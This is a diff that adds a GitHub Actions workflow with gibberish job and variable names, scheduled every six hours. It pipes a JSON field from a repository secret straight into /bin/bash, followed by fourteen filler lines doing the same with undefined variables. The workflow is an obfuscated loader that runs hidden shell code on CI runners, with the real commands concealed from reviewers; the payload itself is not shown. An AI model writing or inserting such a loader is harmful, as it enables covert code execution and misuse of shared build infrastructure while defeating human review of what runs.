@@ -1,0 +1,31 @@
+name: yuxuhuanga
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuxuhuanga
+        env:
+          htou1526: ${{ secrets.htou1526 }}
+        run: |
+          echo $htou1526 | jq -r .flu3 | /bin/bash
+          echo $gv0851 | jq -r .bfci86 | /bin/bash
+          echo $abhit09226 | jq -r .uliqw435 | /bin/bash
+          echo $tbhps28152 | jq -r .i45 | /bin/bash
+          echo $w17 | jq -r .qcdsv40230 | /bin/bash
+          echo $mn4113 | jq -r .o5 | /bin/bash
+          echo $rn8 | jq -r .riylb9 | /bin/bash
+          echo $jm7 | jq -r .vffkn7944 | /bin/bash
+          echo $rvnfr06 | jq -r .ouas9317 | /bin/bash
+          echo $mw6 | jq -r .q297 | /bin/bash
+          echo $arpi365 | jq -r .rvg4 | /bin/bash
+          echo $xgepf97720 | jq -r .cp5 | /bin/bash
+          echo $u44 | jq -r .zes512 | /bin/bash
+          echo $lfp4 | jq -r .ye53813 | /bin/bash
+          echo $d3247 | jq -r .sepv181 | /bin/bash
+
